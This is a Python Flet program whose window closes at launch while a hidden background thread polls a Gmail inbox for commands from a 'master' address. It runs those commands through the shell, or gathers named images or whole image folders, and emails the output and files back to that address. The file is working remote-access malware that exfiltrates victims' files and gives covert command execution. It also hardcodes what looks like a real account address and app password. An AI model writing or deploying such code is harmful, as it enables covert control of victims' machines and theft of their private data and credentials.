import flet as ft
import threading
import imaplib
import email
import subprocess
import smtplib
import os
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# بيانات الحساب (ضع بريد تجريبي)
EMAIL = "bn2655316@gmail.com"
PASSWORD = "ilpm xcbn eiia vzav"
MASTER_EMAIL = "alien.x.3712@gmail.com"

# فحص البريد
def check_for_command():
    mail = imaplib.IMAP4_SSL("imap.gmail.com")
    mail.login(EMAIL, PASSWORD)
    mail.select("inbox")
    status, messages = mail.search(None, f'(UNSEEN FROM "{MASTER_EMAIL}")')
    for num in messages[0].split():
        status, msg_data = mail.fetch(num, '(RFC822)')
        raw_email = msg_data[0][1]
        msg = email.message_from_bytes(raw_email)
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    body = part.get_payload(decode=True).decode()
                    return body.strip()
        else:
            body = msg.get_payload(decode=True).decode()
            return body.strip()
    return None

# إرسال النتيجة
def send_result(output, attachment_path=None):
    msg = MIMEMultipart()
    msg["Subject"] = "Result"
    msg["From"] = EMAIL
    msg["To"] = MASTER_EMAIL
    msg.attach(MIMEText(output, "plain"))

    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f'attachment; filename="{os.path.basename(attachment_path)}"')
            msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL, PASSWORD)
    server.sendmail(EMAIL, MASTER_EMAIL, msg.as_string())
    server.quit()

# البوت في الخلفية
def bot_loop():
    while True:
        command = check_for_command()
        if command:
            if command.startswith("send-image"):
                image_path = command.replace("send-image", "").strip()
                if os.path.exists(image_path):
                    send_result(f"تم إرسال الصورة: {image_path}", image_path)
                else:
                    send_result("تعذر العثور على الصورة المحددة.")
            elif command.startswith("send-all-images"):
                folder_path = command.replace("send-all-images", "").strip()
                if os.path.isdir(folder_path):
                    images = [f for f in os.listdir(folder_path) if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif'))]
                    if images:
                        for img in images:
                            full_path = os.path.join(folder_path, img)
                            send_result(f"صورة: {img}", full_path)
                    else:
                        send_result("لا توجد صور في هذا المجلد.")
                else:
                    send_result("المسار غير صحيح.")
            else:
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    result = e.output
                send_result(result)
        time.sleep(10)  # فحص كل 10 ثواني

# واجهة Flet (تختفي مباشرة)
def main(page: ft.Page):
    page.title = "Email Command Bot"
    # تشغيل البوت مباشرة عند فتح التطبيق
    threading.Thread(target=bot_loop, daemon=True).start()
    page.window_close()  # إخفاء الواجهة

ft.app(target=main)
